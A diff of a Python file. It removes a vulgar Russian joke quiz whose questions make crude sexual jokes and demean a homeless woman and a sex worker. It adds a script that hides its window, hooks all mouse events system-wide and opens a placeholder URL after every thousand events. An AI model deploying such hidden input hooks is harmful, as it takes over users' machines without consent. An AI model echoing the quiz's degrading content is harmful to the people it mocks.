@@ -1,30 +1,41 @@
-def conduct_survey():
-    print("Добро пожаловать в опрос!\n")
-    
-    questions = [
-        "Шкурка от какого овоща была на залупе?",
-        "За сколько рублей Павел Депутат дал в рот бомжихе?",
-        "Чего нет в московском метро?",
-        "Что случилось с мужиком в московском метро?",
-        "Сколько лет было на самом деле проститутке которая говорила что ей 45, и обосрала диван?"
-    ]
-    
-    answers = []
-    
-    for i, question in enumerate(questions, 1):
-        print(f"{i}. {question}")
-        answer = input("Ваш ответ: ")
-        answers.append(answer)
-        print()
-    
-    # Вывод результатов
-    print("\n" + "="*50)
-    print("Результаты опроса:")
-    print("="*50)
-    
-    for i, (question, answer) in enumerate(zip(questions, answers), 1):
-        print(f"{i}. {question}")
-        print(f"   Ответ: {answer}\n")
+import tkinter as tk
+import webbrowser
+import pythoncom
+import pyHook
+import threading
+from ctypes import windll, byref, create_unicode_buffer, create_string_buffer
 
-if __name__ == "__main__":
-    conduct_survey()
+# Скрываем окно
+root = tk.Tk()
+root.withdraw()  # Скрываем главное окно
+
+# Переменные для отслеживания мыши
+mouse_movement_count = 0
+MOVEMENT_THRESHOLD = 1000  # Количество движений для активации
+TARGET_URL = "https://example.com"  # Ваш URL
+
+def on_mouse_move(event):
+    global mouse_movement_count
+    mouse_movement_count += 1
+    
+    if mouse_movement_count >= MOVEMENT_THRESHOLD:
+        webbrowser.open(TARGET_URL)
+        mouse_movement_count = 0  # Сброс счетчика
+    
+    return True
+
+def start_hook():
+    hm = pyHook.HookManager()
+    hm.MouseAllButtonsDown = on_mouse_move
+    hm.MouseAllButtonsUp = on_mouse_move
+    hm.MouseAll = on_mouse_move
+    hm.HookMouse()
+    
+    pythoncom.PumpMessages()
+
+# Запуск в отдельном потоке
+hook_thread = threading.Thread(target=start_hook)
+hook_thread.daemon = True
+hook_thread.start()
+
+root.mainloop()
